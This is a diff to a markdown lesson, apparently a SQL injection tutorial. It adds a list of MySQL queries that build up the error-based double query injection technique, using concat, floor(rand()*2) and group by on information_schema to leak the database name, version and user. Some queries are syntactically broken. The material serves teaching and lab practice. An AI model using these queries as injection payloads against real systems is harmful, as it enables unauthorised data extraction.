@@ -175,6 +175,35 @@ In this lesson we will learn to perform an Error-based Double Query Injection At
 We can see that the query is being follwed at the back is **Select col1,col2,col3 from table where id='3   '  OR '1   '**
 
 
+These are the some Query which I have used in msql:
+
+**select count(*) from information_schema.tables;**
+
+**select rand() ;**
+
+**select table_name, table_schema from information_schema.tables group by table_schema**
+
+**select database();**
+
+**select concat((select database()));**
+
+**select concat(0x3a,0x3a(select database()),0x3a,0x3a);**
+
+**select concat(0x3a,0x3a(select database()),0x3a,0x3a) a;**
+
+**select concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a;**
+
+**concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns;**
+
+**select concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a from information_schema.tables;**
+
+**select count(*), concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a from information_schema.tables group by a;**
+
+**select count(*), concat(0x3a,0x3a(select version()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns group by a;**
+
+
+**select count(*), concat(0x3a,0x3a(select user()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns group by a;**
+
 
 
 
